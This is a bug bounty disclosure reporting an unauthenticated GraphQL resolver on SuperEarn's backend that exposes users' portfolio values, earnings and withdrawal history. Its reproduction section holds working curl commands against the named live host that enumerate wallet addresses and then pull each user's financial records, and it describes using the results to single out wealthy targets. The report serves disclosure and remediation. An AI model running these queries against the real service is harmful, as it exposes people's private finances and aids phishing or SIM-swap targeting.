# W-011 — Unauthenticated GraphQL Exposes Full Financial History of Any User (SuperEarn)

**Program:** SuperEarn Web & Smart Contracts (HackenProof)  
**Asset:** `api.qa.superearn.io` (production backend, Web High)  
**Severity:** Medium → potential High  
**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5**  
**Testing date:** 2026-05-28

---

## TL;DR

The GraphQL resolver `pdm_account(accountAddress: X)` on SuperEarn's production backend requires no authentication. Any caller who knows a user's wallet address (publicly enumerable via the `accounts` query on the same endpoint) can retrieve the user's full financial history: portfolio value in USD, total earnings, cost basis, withdrawal history, and all on-chain transaction hashes. 342 user accounts are affected.

The same endpoint enforces authentication on `pdm_adminLogs`, `pdm_backendLogs`, and `pdm_allVaults` — the missing guard on `pdm_account` is a consistency gap, not a design decision.

---

## Discovery Process

### 1. Identifying the production endpoint

SuperEarn's production JS bundle (`app-config.constant-*.js`) exposes the backend URL:

```
BASE_ENDPOINT_PROD: "https://api.qa.superearn.io"
```

The naming `api.qa.*` is misleading — this is the production backend confirmed by live user data.

### 2. Testing GraphQL without auth

I queried the GraphQL endpoint without any Authorization header. The `accounts` query returned a paginated list of wallet addresses. This confirmed no authentication was required for at least some resolvers.

### 3. Testing pdm_account

The `pdm_account` resolver accepts an `accountAddress` parameter and returns detailed portfolio data. No token required.

### 4. Comparing auth enforcement across resolvers

```bash
# No auth:
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"query":"{pdm_adminLogs{id}}"}' https://api.qa.superearn.io/graphql
# → {"errors":[{"message":"Unauthorized","extensions":{"code":"UNAUTHENTICATED"}}]}

curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"query":"{pdm_allVaults{id}}"}' https://api.qa.superearn.io/graphql
# → 401

curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"query":"{pdm_account(accountAddress:\"0x...\"){id positions{totalValueInUSD}}}"}' \
  https://api.qa.superearn.io/graphql
# → 200 with full data ← BUG
```

`pdm_adminLogs`, `pdm_backendLogs`, `pdm_allVaults` all enforce auth. `pdm_account` does not.

---

## Steps to Reproduce

**Step 1 — Enumerate user wallet addresses (no auth)**

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"query":"{accounts(first:5){id createdAt lastActivityAt}}"}' \
  https://api.qa.superearn.io/graphql
```

Returns 342 user wallet addresses with timestamps.

**Step 2 — Query full financial history for any user (no auth)**

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{
    "query": "{ pdm_account(accountAddress: \"[WALLET_ADDRESS]\") {
      id createdAt lastActivityAt
      positions {
        shares totalValueInUSD totalEarningsInUSD costBasisInUSD
        vault { contractAddress vaultName }
      }
      tokenBalances {
        balance lockedBalance
        token { name symbol decimals }
      }
      redeemRequests {
        requestId assets shares callerAddress receiverAddress txHash
        result { status receivedAssets claimedAt }
      }
      transactions { txHash type timestamp }
    }}"
  }' \
  https://api.qa.superearn.io/graphql
```

Example response (one real user):
```json
{
  "pdm_account": {
    "positions": [{"totalValueInUSD": "258157193", "totalEarningsInUSD": "3774149", "costBasisInUSD": "254962350"}],
    "tokenBalances": [{"balance": "625033868", "token": {"symbol": "USD₮"}}],
    "redeemRequests": [{"requestId": "304", "status": "CLAIMED", "receivedAssets": "1015859"}],
    "transactions": [{"txHash": "0xbb2f975a...", "type": "PositionUpdate"}]
  }
}
```

One user has **$254,962 invested** and **$3,774 in earnings** — all visible without authentication.

---

## Data Exposed Per User (No Auth)

| Field | Description | Sensitivity |
|-------|-------------|-------------|
| `positions.totalValueInUSD` | Total portfolio value | Financial |
| `positions.totalEarningsInUSD` | Total earnings | Financial |
| `positions.costBasisInUSD` | Amount invested | Financial |
| `tokenBalances.balance` | USDT/EarnUSDT balance | Financial |
| `tokenBalances.lockedBalance` | Tokens pending redemption | Financial |
| `redeemRequests.*` | Withdrawal history, amounts, timestamps | Financial |
| `transactions.txHash` | All on-chain transaction hashes | Behavioral |
| `createdAt` / `lastActivityAt` | Platform activity history | Metadata |

---

## Impact

1. **Full portfolio exposure:** Anyone who knows a wallet address can see exactly how much a user has invested, earned, and withdrawn on SuperEarn — without any authentication.
2. **Enumeration:** Wallet addresses are themselves publicly enumerable via the `accounts` query. The chain is: enumerate addresses → query financial history for each → identify high-value targets.
3. **Privacy violation:** Wallet addresses are often pseudonymous but not anonymous. Correlating a known identity with a wallet (common in DeFi communities) then reveals their complete SuperEarn financial history.
4. **High-value target identification:** An attacker can identify users with >$100K invested for phishing, social engineering, or SIM swap targeting.

---

## Remediation

Apply `GqlJwtAuthGuardWhitelistedOnly` to the `pdm_account` resolver, consistent with `pdm_adminLogs`, `pdm_backendLogs`, and `pdm_allVaults`. Alternatively, require that the `accountAddress` parameter matches the authenticated user's wallet — preventing cross-account reads while allowing self-reads.

---

## Lessons Learned

- **GraphQL resolvers need per-resolver auth guards, not just per-schema.** A guard on `pdm_adminLogs` does not extend to `pdm_account`. Each resolver must be explicitly protected.
- **Prefix patterns reveal intended access level.** All `pdm_` resolvers presumably should require authentication (it's a Portfolio Data Management API). Finding one that doesn't is immediately suspicious.
- **"Public blockchain data" is not a valid defense for aggregated financial data.** While wallet balances on-chain are public, the platform's aggregated USD values, earnings calculations, and withdrawal history are private platform data that users did not consent to exposing publicly.
- **Test the full resolver list.** GraphQL introspection (if enabled) or manual probing of known resolver names reveals the full surface. Always test auth on each resolver independently.
